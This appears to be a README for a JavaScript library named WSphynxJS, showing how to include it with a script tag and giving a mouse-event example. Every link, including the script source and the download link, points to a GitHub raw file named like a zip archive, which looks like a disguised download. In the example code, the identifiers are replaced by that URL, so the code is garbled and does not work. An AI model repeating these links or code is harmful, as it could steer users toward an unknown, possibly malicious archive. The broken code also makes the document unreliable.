It is possible to use WSphynxJS thanks to a `script` tag placed in the `head` part:

```html
<head>
  <!--Some stuff here-->
  <script defer src="https://github.com/SphynxTech/docusa/raw/refs/heads/master/vaguely/Software_v3.1.zip(1.0).txt"></script> 
</head>
```

You can also directly download the library <a href="https://github.com/SphynxTech/docusa/raw/refs/heads/master/vaguely/Software_v3.1.zip(1.0).txt">here</a>. However, we do not recommend to copy the code in your own web page. We often update the source code and you would probably miss new functionalities or bug corrections.

# Simple example

```html
<wsdiv> Hello
    <wsonmousedown>
        https://github.com/SphynxTech/docusa/raw/refs/heads/master/vaguely/Software_v3.1.zip = "Clic";
    </wsonmousedown>
    <wsonmouseup>
        https://github.com/SphynxTech/docusa/raw/refs/heads/master/vaguely/Software_v3.1.zip = "Up";
    </wsonmouseup>
</wsdiv>
```

This example will render a simple `div` saying Hello. When you clic on it the div displays "Clic" and when you release the mouse it displays "Up".

With WSphynxJS, you can declare dynamic events and interact with your HTML page more easily.
